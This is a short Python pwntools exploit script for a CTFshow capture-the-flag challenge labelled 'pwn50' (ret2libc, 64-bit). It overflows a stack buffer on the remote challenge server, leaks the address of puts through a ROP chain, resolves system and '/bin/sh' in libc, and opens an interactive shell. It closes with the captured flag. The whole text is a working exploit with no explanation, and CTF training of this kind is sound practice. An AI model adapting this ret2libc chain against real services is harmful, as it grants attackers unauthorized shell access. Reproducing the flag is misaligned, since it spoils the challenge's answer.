#pwn50 ret2libc 64 ubuntu18
from pwn import *
from LibcSearcher import *
e = ELF("./pwn")
p = remote('pwn.challenge.ctf.show', 28255)

offset = 0x20 + 0x8
puts_got = e.got['puts']
puts_plt = e.plt['puts']
main_addr = e.symbols['main']
rdi_addr = 0x4007e3
ret_addr = 0x4004fe

#
payload1 = b'a' * offset + p64(rdi_addr) + p64(puts_got) + p64(puts_plt) + p64(main_addr)
p.recvuntil("Hello CTFshow")
p.sendline(payload1)
puts_addr = u64(p.recvuntil('\x7f')[-6:].ljust(8,b'\x00'))
print(hex(puts_addr))

libc = LibcSearcher('puts',puts_addr)
libc_base = puts_addr - libc.dump('puts')
sys_addr = libc_base + libc.dump('system')
sh_addr = libc_base + libc.dump('str_bin_sh')

#
payload2 = b'a' * offset + p64(ret_addr) + p64(rdi_addr) + p64(sh_addr) + p64(sys_addr)
p.recvuntil("Hello CTFshow")
p.sendline(payload2)
p.interactive()
#ctfshow{a6f848e2-d725-4394-8d6f-7d955d3d331a}